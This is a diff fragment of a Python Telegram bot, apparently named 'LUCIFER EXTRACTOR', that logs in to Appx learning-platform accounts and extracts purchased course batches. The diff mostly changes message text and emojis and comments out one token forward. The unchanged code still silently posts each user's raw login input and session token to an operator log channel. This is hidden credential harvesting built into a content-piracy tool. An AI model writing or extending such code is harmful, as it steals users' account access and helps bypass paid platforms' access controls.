@@ -317,16 +317,16 @@ async def appex_v5_txt(app, message, api, name):
             print(f"An error occurred: {str(e)}")
             return await message.reply_text("NO BATCH PURCHASED")    
 
-    dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n{FFF}")
+    dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for 🔑{app_name} \n 🧬{api_base}\n\n `{raw_text}` \n\n`{token}`\n🛡️{FFF}")
     if len(FFF) <= 4096:
         await app.send_message(log_channel, dl)
-        await app.send_message(log_channel2, f"`{token}`")
+        #await app.send_message(log_channel2, f"`{token}`")
         editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")      
     else:
         plain_FFF = FFF.replace("**", "").replace("`", "")
         file_path = f"{app_name}.txt"
         with open(file_path, "w") as file:
-            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name}\n\nToken: {token}\n\n{plain_FFF}")
+            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for 🔑{app_name}\n\n🔓Token: {token}\n\n{plain_FFF}")
 
         await app.send_document(
             message.chat.id,
@@ -424,7 +424,7 @@ async def appex_v5_txt(app, message, api, name):
                     f"⏱️ <b>Extracted In:</b> <code>{elapsed_time:.1f}s</code>\n"
                     f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
                     f"╭━━━━━━━『 <b>💾 DOWNLOAD INFO</b> 』━━━━━━━╮\n"
-                    f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHISIR'>LUCIFER ⚡</a>\n"
+                    f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHUSIR'>LUCIFER ⚡</a>\n"
                     f"⚙️ <b>Extractor:</b> <code>LUCIFER EXTRACTOR ⚡</code>\n"
                     f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                 )
